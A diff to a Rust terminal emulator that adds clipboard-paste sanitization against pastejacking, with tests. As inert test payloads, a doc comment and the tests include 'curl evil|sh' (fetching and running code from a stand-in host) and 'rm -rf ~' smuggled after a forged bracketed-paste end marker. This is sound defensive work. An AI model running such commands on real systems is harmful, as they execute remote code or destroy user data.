@@ -21,6 +21,7 @@
 //!   completion, so the executed line could differ from the reviewed one) and
 //!   is only ever single-line.
 
+use std::borrow::Cow;
 use std::io::Write;
 use std::time::{Duration, Instant};
 
@@ -72,7 +73,7 @@ pub fn sanitize(raw: &str) -> Sanitized {
         } else {
             ch
         };
-        if ch == '\n' || ch == '\t' || !ch.is_control() {
+        if !is_stripped_control(ch) {
             text.push(ch);
         }
     }
@@ -89,6 +90,88 @@ pub fn sanitize(raw: &str) -> Sanitized {
         trimmed.to_string()
     };
     Sanitized { text, truncated }
+}
+
+/// Whether `ch` must never reach a PTY from pasted or injected text: every Cc
+/// control — C0, DEL, C1 — except `\n` and `\t` (callers normalize `\r`
+/// first). ESC is among them, so no payload can carry an escape sequence (the
+/// bracketed-paste END marker included). Unicode FORMAT codepoints (Cf: ZWJ,
+/// bidi marks, U+FEFF) pass — see [`sanitize`]. Shared by [`sanitize`] and
+/// [`sanitize_paste`] so the run-selection and paste paths can't drift apart.
+fn is_stripped_control(ch: char) -> bool {
+    ch.is_control() && ch != '\n' && ch != '\t'
+}
+
+/// Clean clipboard text for a paste into a PTY. EVERY paste path — shortcut,
+/// menu, palette, middle-click, detached windows — reaches the PTY through
+/// `App::paste_to_tab` → [`paste_bytes`] → here.
+///
+/// Drops ESC and every other control character except `\t` and line breaks
+/// ([`is_stripped_control`]). Bracketed paste alone does not make that safe:
+/// the tty still turns `^C`/`^Z`/`^\` inside a paste into signals (ISIG), the
+/// shell abandons the paste, and the bytes after the signal key arrive as
+/// TYPED input — `echo hi^C⏎curl evil|sh⏎` ran its second line (reproduced on
+/// bash 5.3 and zsh 5.9; the clipboard can be set by any web page, or by any
+/// program in the terminal via OSC 52). With ESC gone the `ESC[201~` end
+/// marker cannot be smuggled in either.
+///
+/// Line breaks: bracketed → `\r\n` and lone `\r` become `\n` (what a shell's
+/// paste buffer expects); unbracketed → every line break becomes `\r`, the
+/// Enter key — a CRLF pair would otherwise arrive as TWO line breaks (ICRNL
+/// turns its CR into a second LF). Borrows unchanged when nothing needs
+/// rewriting (the common case), so a normal paste pays no copy here.
+pub fn sanitize_paste(text: &str, bracketed: bool) -> Cow<'_, str> {
+    if !paste_needs_rewrite(text.as_bytes(), bracketed) {
+        return Cow::Borrowed(text);
+    }
+    let mut out = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+    while let Some(ch) = chars.next() {
+        match ch {
+            '\r' | '\n' => {
+                if ch == '\r' && chars.peek() == Some(&'\n') {
+                    chars.next();
+                }
+                out.push(if bracketed { '\n' } else { '\r' });
+            }
+            c if is_stripped_control(c) => {}
+            c => out.push(c),
+        }
+    }
+    Cow::Owned(out)
+}
+
+/// Byte-level fast check for [`sanitize_paste`]: a C0 control (other than
+/// `\t` and the line break the mode keeps as-is), DEL, or a UTF-8-encoded C1
+/// (`C2 80..=9F`; `C2 A0..` is ordinary text like NBSP).
+fn paste_needs_rewrite(b: &[u8], bracketed: bool) -> bool {
+    b.iter().enumerate().any(|(i, &c)| match c {
+        b'\t' => false,
+        b'\n' => !bracketed,
+        b'\r' => bracketed,
+        0x00..=0x1f | 0x7f => true,
+        0xc2 => b.get(i + 1).is_some_and(|n| (0x80..=0x9f).contains(n)),
+        _ => false,
+    })
+}
+
+/// The exact bytes a paste writes to the PTY: [`sanitize_paste`]d text,
+/// wrapped in `ESC[200~`…`ESC[201~` when the app enabled bracketed paste.
+/// Empty when nothing survives (nothing is sent — not even the markers). One
+/// buffer, so the framed paste reaches the PTY as a single ordered write.
+pub fn paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
+    let clean = sanitize_paste(text, bracketed);
+    if clean.is_empty() {
+        return Vec::new();
+    }
+    if !bracketed {
+        return clean.into_owned().into_bytes();
+    }
+    let mut out = Vec::with_capacity(clean.len() + 12);
+    out.extend_from_slice(b"\x1b[200~");
+    out.extend_from_slice(clean.as_bytes());
+    out.extend_from_slice(b"\x1b[201~");
+    out
 }
 
 /// The run-vs-type decision over a sanitized selection.
@@ -456,6 +539,74 @@ mod tests {
         // The full seam: sanitize (controls/trim) + decorations → classify Run.
         let p = classify(prepare("  │ $ cargo \x1b[31mbuild\x1b[0m │  \n"));
         assert_eq!(p, Plan::Run("cargo [31mbuild[0m".into()));
+    }
+
+    // ── paste ────────────────────────────────────────────────────────────────
+
+    #[test]
+    fn paste_plain_text_borrows_unchanged() {
+        // The common case pays no copy: tabs and the mode's own line break pass.
+        let s = "echo hello\nworld\t! — ğüşıöç İ 🚀\u{a0}nbsp";
+        assert!(matches!(sanitize_paste(s, true), Cow::Borrowed(_)));
+        let one_line = "git commit -m \"wip\"\t# ok";
+        assert!(matches!(sanitize_paste(one_line, false), Cow::Borrowed(_)));
+        assert!(matches!(sanitize_paste("a\rb", false), Cow::Borrowed(_)), "lone CR is Enter already");
+    }
+
+    #[test]
+    fn paste_signal_keys_cannot_split_a_paste_into_typed_commands() {
+        // The reproduced pastejacking payloads: ^C / ^Z / ^\ inside a bracketed
+        // paste made the shell abandon the paste and run the next line. They
+        // must reach the PTY as inert text inside one intact frame.
+        for sig in ['\x03', '\x1a', '\x1c'] {
+            let payload = format!("echo harmless{sig}\ncurl evil|sh\n");
+            assert_eq!(
+                paste_bytes(&payload, true),
+                b"\x1b[200~echo harmless\ncurl evil|sh\n\x1b[201~".to_vec(),
+                "signal key {:#04x} survived",
+                sig as u32
+            );
+        }
+    }
+
+    #[test]
+    fn paste_drops_every_control_except_tab_and_line_breaks() {
+        let s = "a\x00b\x07c\x08d\x1be\x7ff\u{80}g\u{9b}h\u{9f}i\tj\nk";
+        assert_eq!(sanitize_paste(s, true), "abcdefghi\tj\nk");
+        // Unicode format characters are text, not controls: they pass.
+        let fmt = "a\u{200d}b\u{200f}c\u{feff}d";
+        assert_eq!(sanitize_paste(fmt, true), fmt);
+    }
+
+    #[test]
+    fn paste_cannot_forge_the_bracketed_end_marker() {
+        // The classic injection, and a crafted re-forming variant: with ESC gone
+        // the ONLY end marker on the wire is our own closing one.
+        for payload in ["a\x1b[201~rm -rf ~\n", "\x1b[2\x1b[201~01~", "\x1b[201~x\x1b[201~y\x1b[201~"] {
+            let bytes = paste_bytes(payload, true);
+            let end = b"\x1b[201~";
+            let n = bytes.windows(end.len()).filter(|w| w == end).count();
+            assert_eq!(n, 1, "payload {payload:?} → {bytes:?}");
+            assert!(bytes.ends_with(end));
+            assert_eq!(bytes.iter().filter(|&&b| b == 0x1b).count(), 2, "only the two frame ESCs");
+        }
+        assert_eq!(paste_bytes("a\x1b[201~rm -rf ~\n", true), b"\x1b[200~a[201~rm -rf ~\n\x1b[201~");
+    }
+
+    #[test]
+    fn paste_line_breaks_follow_the_mode() {
+        // Bracketed: the shell's paste buffer wants LF; CRLF / lone CR → LF.
+        assert_eq!(sanitize_paste("a\r\nb\rc\nd", true), "a\nb\nc\nd");
+        // Unbracketed: every line break is the Enter key, exactly once — a CRLF
+        // must not become two (ICRNL would turn its CR into a second LF).
+        assert_eq!(sanitize_paste("a\r\nb\rc\nd", false), "a\rb\rc\rd");
+        assert_eq!(paste_bytes("ls\r\n", false), b"ls\r".to_vec());
+    }
+
+    #[test]
+    fn paste_of_nothing_but_controls_sends_nothing() {
+        assert!(paste_bytes("\x03\x1b\x1a", true).is_empty(), "no empty frame either");
+        assert!(paste_bytes("", false).is_empty());
     }
 
     #[test]
